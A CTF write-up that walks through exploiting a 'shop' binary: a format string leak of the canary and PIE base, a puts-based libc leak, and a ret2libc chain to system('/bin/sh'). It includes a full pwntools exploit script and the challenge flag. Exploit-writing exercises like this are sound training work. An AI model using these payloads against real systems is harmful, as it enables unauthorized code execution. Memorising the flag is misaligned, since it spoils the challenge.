# Challenge Description

Do you hear, about ASLR and stack canary!!!

This is the privesc part of our PFA project,
if you solve it you are 1337 hacker
Author: YasseX

# Challenge Overview

This CTF is about bypassing ASLR and stack canaries to achieve a ret2libc attack.

To solve the challenge, we need to:
	-Leak a stack canary and the program base address (to bypass ASLR) using a format string vulnerability.
	-Leak a libc address (via puts) to calculate the libc base address.
	-Execute a ret2libc attack to spawn a shell (/bin/sh).

Step-by-Step Exploit

# 1. Leaking main address and stack canary (Format String Attack)

First, we abuse a format string vulnerability to leak two important values:
The address of the main function (to calculate the binary base address and defeat ASLR).
The value of the stack canary (to bypass the stack protector).
io.sendline(b'%17$p.%13$p')

This sends a format string payload.
We then parse the output:
leak_line = io.recvline().strip()
main_str, canary_str = leak_line.split(b'.')
main = int(main_str, 16)
canary = int(canary_str, 16)

From here:

main gives us the base address of the binary.
canary is the random stack canary value protecting the stack.

# 2. Calculating Important Addresses
Since the binary is position-independent (PIE enabled), we calculate actual addresses by knowing the offsets:
binary_base = main - main_offset
getchar = getchar_got_offset + binary_base
puts = puts_plt_offset + binary_base
pop_rdi = pop_rdi_offset + binary_base
ret = ret_offset + binary_base

This allows us to find:

getchar (in GOT)
puts (in PLT)
pop rdi; ret gadget
ret gadget (for stack alignment if needed)

# 3. Leaking a libc address
Next, we prepare a payload to leak the real address of getchar in libc using puts:
payload = b'Y' * 104
payload += p64(canary)
payload += b'Y' * 8
payload += p64(pop_rdi)
payload += p64(getchar)
payload += p64(puts)
payload += p64(main)

This sends the address of getchar to stdout using puts, allowing us to calculate the libc base address.

getchar_libc = u64(io.recvline().strip().ljust(8, b"\x00"))
libc_base = getchar_libc - getchar_libc_offset

# 4. Final ret2libc Attack
With the libc base address known, we can find:

system function
/bin/sh string

system_address = libc_base + system_offset
bin_sh_address = libc_base + bin_sh_offset

Finally, we craft the final payload:
payload = b'Y' * 104
payload += p64(canary)
payload += b'A' * 8
payload += p64(pop_rdi)
payload += p64(bin_sh_address)
payload += p64(ret)
payload += p64(system_address)

This calls system("/bin/sh"), giving us a shell!


# Here is the full exploit used to solve the challenge:

from pwn import *

context.binary = 'shop'
elf = ELF('shop')
rop = ROP(elf)
io = process()


main_offset = 0x11e0
puts_plt_offset = 0x1040
getchar_got_offset = 0x4030
getchar_libc_offset = 0x86380
bin_sh_offset = 0x1a7e43
system_offset = 0x528f0
pop_rdi_offset = 0x11cc
ret_offset = 0x1016

io.sendline(b'%17$p.%13$p')
io.recvuntil(b'Welcome, ')

leak_line = io.recvline().strip()

main_str, canary_str = leak_line.split(b'.')

main = int(main_str, 16)
canary = int(canary_str, 16)

print('the main functions is : ',hex(main))
print('the canary is : ',hex(canary))

binary_base = main - main_offset
getchar = getchar_got_offset + binary_base
puts = puts_plt_offset + binary_base
pop_rdi = pop_rdi_offset + binary_base
ret = ret_offset + binary_base

io.sendline(b'4')

payload = b'Y' * 104
payload += p64(canary)
payload += b'YYYYYYYY'
payload += p64(pop_rdi)
payload += p64(getchar)
payload += p64(puts)
payload += p64(main)

io.sendline(payload)

io.recvuntil(b"------------------------------------------------")
io.recvline()
io.recvline()

getchar_libc = u64(io.recvline().strip().ljust(8, b"\x00"))

libc_base = getchar_libc - getchar_libc_offset
system_address = libc_base + system_offset
bin_sh_address = libc_base + bin_sh_offset

print("libc base : ",hex(libc_base))
print("system : ",hex(system_address))
print("/bin/sh : ",hex(bin_sh_address))


io.sendline(b'yassine')
sleep(0.1)
io.sendline(b'4')

payload = b'Y' * 104
payload += p64(canary)
payload += b'A' * 8
payload += p64(pop_rdi)
payload += p64(bin_sh_address)
payload += p64(ret)
payload += p64(system_address)

io.sendline(payload)

io.interactive()


# Summary

Step			Purpose
Format String Leak	Leak main address and canary
Calculate Binary Base	To defeat PIE and ASLR
Leak Libc Address	Leak getchar and calculate libc base
ret2libc		Call system("/bin/sh") for a shell


# Flag : SECOPS{r3t2libc_1s_v3ry_c00l_att4ck}
